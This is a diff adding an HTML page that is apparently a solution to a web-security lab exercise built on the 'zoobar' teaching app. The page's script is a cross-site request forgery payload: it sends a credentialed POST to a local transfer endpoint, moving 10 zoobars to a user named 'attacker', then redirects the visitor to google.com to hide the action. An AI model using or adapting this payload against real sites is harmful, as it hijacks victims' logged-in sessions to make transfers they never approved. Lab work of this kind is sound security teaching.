@@ -1,0 +1,14 @@
+<html>
+<body>
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.onreadystatechange = function () {
+    window.location.href = 'https://google.com';
+  };
+  xhr.open("POST", "http://localhost:8080/transfer.php", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  xhr.withCredentials = true;
+  xhr.send("zoobars=10&recipient=attacker&submission=Send");
+</script>
+</body>
+</html>
